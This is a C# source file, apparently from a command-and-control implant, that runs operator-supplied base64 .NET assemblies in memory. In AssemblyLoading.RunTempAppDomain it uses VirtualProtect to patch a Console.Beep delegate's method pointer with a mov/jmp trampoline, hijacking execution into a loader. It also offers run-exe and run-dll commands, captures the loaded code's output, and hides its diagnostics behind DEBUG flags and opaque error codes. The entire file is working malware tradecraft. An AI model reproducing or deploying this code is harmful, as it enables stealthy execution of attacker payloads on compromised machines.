using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class AssemblyLoading
{
    internal static void RunTempAppDomain(string base64Module, string[] args)
    {
        const string appdomainName = "SharedTemporaryDomain";
        var moduleBytes = Convert.FromBase64String(base64Module);
        AppDomainArgs.targetArgs = args;
#if DEBUG
        Program.STDOUT.WriteLine($"[+] Creating AppDomain: {appdomainName} ");
#endif
        var appDomain = AppDomain.CreateDomain(appdomainName);
        var sleeve = new CrossAppDomainDelegate(Console.Beep);
        var ace = new CrossAppDomainDelegate(ActivateLoader);

        RuntimeHelpers.PrepareDelegate(sleeve);
        RuntimeHelpers.PrepareDelegate(ace);

        const BindingFlags flags = BindingFlags.Instance | BindingFlags.NonPublic;
        var pSleeveMethodObject = sleeve.GetType().GetField("_methodPtrAux", flags)?.GetValue(sleeve);
        var pAceMethodObject = ace.GetType().GetField("_methodPtrAux", flags)?.GetValue(ace);
        if (pSleeveMethodObject == null)
        {
#if DEBUG
            Program.STDOUT.WriteLine("[-] Sleeve function is null");
#endif
            throw new Exception("0x0009");
        }

        if (pAceMethodObject == null)
        {
#if DEBUG
            Program.STDOUT.WriteLine("[-] Ace function is null");
#endif
            throw new Exception("0x0010");
        }

        var pSleeveMethod = (IntPtr)pSleeveMethodObject;
        var pAceMethod = (IntPtr)pAceMethodObject;

#if DEBUG
        Program.STDOUT.WriteLine($"[*] Sleeve function at 0x{pSleeveMethod.ToInt64():X}");
        Program.STDOUT.WriteLine($"[*] Ace function at 0x{pAceMethod.ToInt64():X}");
#endif
        Internals.VirtualProtect(pSleeveMethod, new UIntPtr(12), Internals.PAGE_EXECUTE_READWRITE, out var perms);
        Marshal.WriteByte(pSleeveMethod, 0x48);
        Marshal.WriteByte(IntPtr.Add(pSleeveMethod, 1), 0xb8);
        Marshal.WriteIntPtr(IntPtr.Add(pSleeveMethod, 2), pAceMethod);
        Marshal.WriteByte(IntPtr.Add(pSleeveMethod, 10), 0xff);
        Marshal.WriteByte(IntPtr.Add(pSleeveMethod, 11), 0xe0);
        Internals.VirtualProtect(pSleeveMethod, new UIntPtr(12), perms, out perms);

        try
        {
            appDomain.Load(moduleBytes);
        }
        catch
        {
            // pass
        }
#if DEBUG
        Program.STDOUT.WriteLine("[*] Sleeve patched and module loaded, about to invoke callback...");
#endif
        try
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[+] Executing callback from appdomain: {AppDomain.CurrentDomain.FriendlyName}");
#endif
            appDomain.DoCallBack(sleeve);
        }

        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"[-] Error executing callback from appdomain: {e}");
#endif
            AppDomain.Unload(appDomain);
            throw new Exception("0x0011");
        }
#if DEBUG
        Program.STDOUT.WriteLine("[+] Loaded");
#endif
        AppDomain.Unload(appDomain);

        Console.WriteLine(AppDomainArgs.appDomainOutput);
#if DEBUG
        Program.STDOUT.WriteLine("[+] Unloaded");
#endif
    }

    private static void ActivateLoader()
    {
        var stringWriter = new StringWriter();
        Console.SetOut(stringWriter);

        var targetArgs = AppDomainArgs.targetArgs;
#if DEBUG
        Program.STDOUT.WriteLine($"Executing assembly in appdomain: {AppDomain.CurrentDomain.FriendlyName}");
#endif
        var assemblies = AppDomain.CurrentDomain.GetAssemblies();

#if DEBUG
        if (assemblies.Length != 2)
        {
            Program.STDOUT.WriteLine($"[-] Expected only two assemblies in our App Domain but got: {assemblies.Length}");
            return;
        }
#endif
        var assembly = assemblies[1];
#if DEBUG
        Program.STDOUT.WriteLine("\n");
        Program.STDOUT.WriteLine($"[+] Invoking assembly: {assembly.GetName()} with args: {targetArgs}");
#endif
        var type = assembly.EntryPoint;

        try
        {
            type.Invoke(null, new[] { targetArgs });
#if DEBUG
            Program.STDOUT.WriteLine("Done");
#endif
        }
        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"Error invoking assembly: {e}");
#endif
        }

        AppDomainArgs.appDomainOutput = stringWriter.ToString();
    }

    private static class AppDomainArgs
    {
        public static string[] targetArgs;
        public static string appDomainOutput;
    }

    internal static void RunEphemeralAssembly(string cmd)
    {
        if (Program.callbackFuncPtr != IntPtr.Zero)
        {
            var argsAsArray = Utils.GetArgsAsArray(cmd);
            var newAssembly = Convert.FromBase64String(argsAsArray[2]);
            var echoAssembly = Convert.FromBase64String(argsAsArray[1]);
            var newAppDomainName = Guid.NewGuid().ToString();
#if DEBUG
            Program.STDOUT.WriteLine(" > Run-assembly code is executing in AppDomain: \"{0}\"", newAppDomainName);
#endif
            var func = (Internals.CallBack)Marshal.GetDelegateForFunctionPointer(Program.callbackFuncPtr, typeof(Internals.CallBack));
            var argLength = argsAsArray.Skip(3).ToArray().Length;
            var argsString = string.Join(" ", argsAsArray.Skip(3).ToArray());
            func(newAppDomainName, newAssembly, newAssembly.Length, echoAssembly, echoAssembly.Length, argsAsArray[2], argsAsArray[3], argLength, argsString,
                out var output, out var outputStringIntPtr);
#if DEBUG
            Program.STDOUT.WriteLine(" > Output location in memory: 0x{0:X} with length: {1}\n", outputStringIntPtr.ToInt64(), output);
            var outStr = Marshal.PtrToStringAnsi(outputStringIntPtr, output);
            Program.STDOUT.WriteLine(outStr);
#endif
        }
        else
        {
#if DEBUG
            Program.STDOUT.WriteLine("[-] Cannot find IntPtr to NewAppDomain");
#endif
        }
    }

    internal static void RunAssembly(string command)
    {
        var splitArgs = command.Split(new[] { " " }, StringSplitOptions.RemoveEmptyEntries);
        var i = 0;
        string functionName = "", commandLine = "", assemblyToRunName = "", name = "";
        foreach (var arg in splitArgs)
        {
            switch (i)
            {
                case 1:
                    assemblyToRunName = arg;
                    break;
                case 2:
                    name = arg;
                    break;
            }

            if (command.ToLower().StartsWith("run-exe"))
            {
                if (i > 2)
                    commandLine = commandLine + " " + arg;
            }
            else
            {
                if (i == 3)
                    functionName = arg;
                else if (i > 3)
                    commandLine = commandLine + " " + arg;
            }

            i++;
        }

        var fullArgs = Utils.GetArgsAsArray(commandLine);
        var args = fullArgs.Skip(1).ToArray();
        var found = false;
        foreach (var iteratingAssembly in AppDomain.CurrentDomain.GetAssemblies())
        {
            if (!iteratingAssembly.FullName.ToLower().StartsWith(name.ToLower())) continue;
            found = true;
            var loadedType = Utils.GetLoadedType(assemblyToRunName + ", " + iteratingAssembly.FullName);
            try
            {
                if (command.ToLower().StartsWith("run-exe"))
                {
                    loadedType.Assembly.EntryPoint.Invoke(null, new object[] { args });
                }
                else if (command.ToLower().StartsWith("run-dll"))
                {
                    try
                    {
                        var output = loadedType.Assembly.GetType(assemblyToRunName)
                            .InvokeMember(functionName, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, args);
                        Console.WriteLine(output.ToString());
                    }
                    catch
                    {
                        var output = loadedType.Assembly.GetType(assemblyToRunName)
                            .InvokeMember(functionName, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null);
                        Console.WriteLine(output.ToString());    
                    }
                }
            }
            catch (NullReferenceException e)
            {
#if DEBUG
                Program.STDOUT.WriteLine($"[-] Exception {e}");
#endif
            }
            catch (Exception e)
            {
#if DEBUG
                Program.STDOUT.WriteLine($"[-] Exception {e}");
#endif
            }

            
            break;
        }
        
        if (!found)
        {
            Console.WriteLine("Assembly not found, has the module been loaded?");
        }
    }

    internal static void RunCoreAssembly(string command)
    {
        try
        {
            var fullArgs = Utils.GetArgsAsArray(command);
            Program.coreAssembly.EntryPoint.Invoke(null, new object[] { fullArgs });
        }
        catch (Exception e)
        {
            Console.WriteLine($"[-] Error running core command: {e}");
        }
    }
}